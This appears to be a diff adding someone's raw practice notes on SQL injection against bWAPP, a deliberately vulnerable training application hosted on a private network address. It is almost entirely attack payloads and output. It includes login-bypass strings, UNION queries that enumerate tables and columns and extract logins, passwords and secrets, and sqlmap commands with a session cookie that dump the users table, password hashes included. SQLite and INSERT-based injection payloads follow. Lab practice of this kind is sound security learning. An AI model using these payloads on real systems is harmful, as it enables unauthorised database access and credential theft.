@@ -1,0 +1,202 @@
+$sql = "SELECT * FROM heroes WHERE login = '" . $login . "' AND password = '" . $password . "'";
+
+
+' or 1=1 #
+
+$sql = "SELECT * FROM heroes WHERE login = '' or 1=1 #' AND password = '" . $password . "'";
+
+' or 1=1 limit 0,1 #
+' or 1=1 limit 1,1 #
+' or 1=1 limit 2,1 #
+
+' union select 1,2,3,4 #
+
+2 4
+
+' union select 1,database(),3,user() #
+
+' union select 1,table_name,3,4 from information_schema.tables where table_schema='bWAPP'#
+
+' union select 1,table_name,3,4 from information_schema.tables where table_schema='bWAPP' and table_name!='blog'#
+
+' union select 1,table_name,3,4 from information_schema.tables where table_schema='bWAPP' and table_name!='blog' and table_name!='heroes' #
+
+' union select 1,table_name,3,4 from information_schema.tables where table_schema='bWAPP' and table_name!='blog' and table_name!='heroes' and table_name!='movies'#
+
+DATABASE -> TABLE -> COLUMN -> 입력 정보
+
+'
+mysql> select column_name from columns where table_name='blog';
+mysql> select column_name from columns where table_name='heroes';
+mysql> select column_name from columns where table_name='movies';
+mysql> select column_name from columns where table_name='users';
+
+
+' union select 1,column_name,3,4 from information_schema.columns where table_name='heroes' #
+
+' union select 1,column_name,3,4 from information_schema.columns where table_name='heroes' and column_name!='id'#
+
+' union select 1,column_name,3,4 from information_schema.columns where table_name='heroes' and column_name!='id' and column_name!='login' #
+
+' union select 1,column_name,3,4 from information_schema.columns where table_name='heroes' and column_name!='id' and column_name!='login' and column_name!='password' #
+
+heroes -> id, login, password, secret
+
+
+' union select 1,login,3,password from heroes #
+' union select 1,login,3,secret from heroes #
+
+' union select 1,login,3,password from heroes limit 0,1 #
+' union select 1,login,3,password from heroes limit 1,1 #
+' union select 1,login,3,password from heroes limit 2,1 #
+
+Welcome Thor, how are you today?
+
+Your secret: Asgard
+
+
+$sql = "SELECT * FROM heroes WHERE login = '" . $login . "' AND password = '" . $password . "'";
+
+thor' or '1'='1
+
+$sql = "SELECT * FROM heroes WHERE login = 'thor' or '1'='1 ' AND password = '" . $password . "'";
+
+
+thor' or '1'='2
+$sql = "SELECT * FROM heroes WHERE login = '" . $login . "' AND password = '" . $password . "'";
+
+
+thor ' or 'b'='b
+$sql = "SELECT * FROM heroes WHERE login = 'thor ' or 'b'='b' AND password = ''";
+
+
+thor ' or 'a'='b
+$sql = "SELECT * FROM heroes WHERE login = 'thor ' or 'a'='b' AND password = ''";
+
+
+thor ' or '1'='1
+$sql = "SELECT * FROM heroes WHERE login = 'thor ' or '1'='1' AND password = ''";
+
+
+thor ' or '1'='0
+$sql = "SELECT * FROM heroes WHERE login = 'thor ' or '1'='0' AND password = '";
+
+
+thor ' or 1=0#
+$sql = "SELECT * FROM heroes WHERE login = 'thor ' or 1=0#' AND password = '";
+
+
+thor ' or 1=2#
+$sql = "SELECT * FROM heroes WHERE login = 'thor ' or 1=2#' AND password = ''";
+
+
+thor ' or 1=1
+$sql = "SELECT * FROM heroes WHERE login = 'thor ' or 1=1' AND password = ''";
+
+
+thor' or 1=1#
+$sql = "SELECT * FROM heroes WHERE login = 'thor ' or 1=1#' AND password = ''";
+
+' or 1=1#
+
+
+http://192.168.20.205/bWAPP/sqli_16.php
+
+Cookie: security_level=0; PHPSESSID=f1eee15268c7c8d2d30f4521e1bd1d9b
+
+login=111&password=111&form=submit
+
+
+sqlmap -u "http://192.168.20.205/bWAPP/sqli_16.php" --cookie="security_level=0; PHPSESSID=f1eee15268c7c8d2d30f4521e1bd1d9b" --data "login=111&password=111&form=submit" --dbs
+
+available databases [5]:
+[*] bWAPP
+[*] cisco
+[*] drupageddon
+[*] information_schema
+[*] mysql
+
+
+sqlmap -u "http://192.168.20.205/bWAPP/sqli_16.php" --cookie="security_level=0; PHPSESSID=f1eee15268c7c8d2d30f4521e1bd1d9b" --data "login=111&password=111&form=submit" -D bWAPP --tables
+
+Database: bWAPP
+[5 tables]
++----------+
+| blog     |
+| heroes   |
+| movies   |
+| users    |
+| visitors |
++----------+
+
+sqlmap -u "http://192.168.20.205/bWAPP/sqli_16.php" --cookie="security_level=0; PHPSESSID=f1eee15268c7c8d2d30f4521e1bd1d9b" --data "login=111&password=111&form=submit" -D bWAPP -T users --columns
+
+Database: bWAPP
+Table: users
+[9 columns]
++-----------------+--------------+
+| Column          | Type         |
++-----------------+--------------+
+| activated       | tinyint(1)   |
+| activation_code | varchar(100) |
+| admin           | tinyint(1)   |
+| email           | varchar(100) |
+| id              | int(10)      |
+| login           | varchar(100) |
+| password        | varchar(100) |
+| reset_code      | varchar(100) |
+| secret          | varchar(100) |
++-----------------+--------------+
+
+
+sqlmap -u "http://192.168.20.205/bWAPP/sqli_16.php" --cookie="security_level=0; PHPSESSID=f1eee15268c7c8d2d30f4521e1bd1d9b" --data "login=111&password=111&form=submit" -D bWAPP -T users -C id,login,password,secret,email --dump
+
+Database: bWAPP
+Table: users
+[2 entries]
++----+--------+------------------------------------------------+-------------------------------------+--------------------------+
+| id | login  | password                                       | secret                              | email                    |
++----+--------+------------------------------------------------+-------------------------------------+--------------------------+
+| 1  | A.I.M. | 6885858486f31043e5839c735d99457f045affd0 (bug) | A.I.M. or Authentication Is Missing | bwapp-aim@mailinator.com |
+| 2  | bee    | 6885858486f31043e5839c735d99457f045affd0 (bug) | Any bugs?                           | bwapp-bee@mailinator.com |
++----+--------+------------------------------------------------+-------------------------------------+--------------------------+
+
+
+' or 1=1 --
+
+0' union select 1,2,3,4,5,6 --
+
+2 3 5 4
+
+0' union select 1,sqlite_version(),3,4,5,6 --
+
+0' union select 1,tbl_name,3,4,5,6 from sqlite_master --
+
+0' union select 1,sql,3,4,5,6 from sqlite_master where tbl_name='users' --
+
+0' union select 1,id,login,password,email,6 from users --
+
+
+'test
+
+ear 'test','bee')' at line 1
+
+$sql = "INSERT INTO blog (date, entry, owner) VALUES (now(),'" . $entry . "','" . $owner . "')";
+
+$sql = "INSERT INTO blog (date, entry, owner) VALUES (now(),''test','" . $owner . "')";
+
+test', (select database())) #
+
+$sql = "INSERT INTO blog (date, entry, owner) VALUES (now(),'" . $entry . "','" . $owner . "')";
+
+$sql = "INSERT INTO blog (date, entry, owner) VALUES (now(),'test', (select database())) #','" . $owner . "')";
+
+test', (select table_name from information_schema.tables limit 0,1)) #
+test', (select table_name from information_schema.tables limit 1,1)) #
+test', (select table_name from information_schema.tables limit 2,1)) #
+test', (select table_name from information_schema.tables limit 3,1)) #
+test', (select table_name from information_schema.tables limit 4,1)) #
+test', (select table_name from information_schema.tables limit 5,1)) #
+test', (select table_name from information_schema.tables limit 6,1)) #
+test', (select table_name from information_schema.tables limit 7,1)) #
+test', (select table_name from information_schema.tables limit 8,1)) #
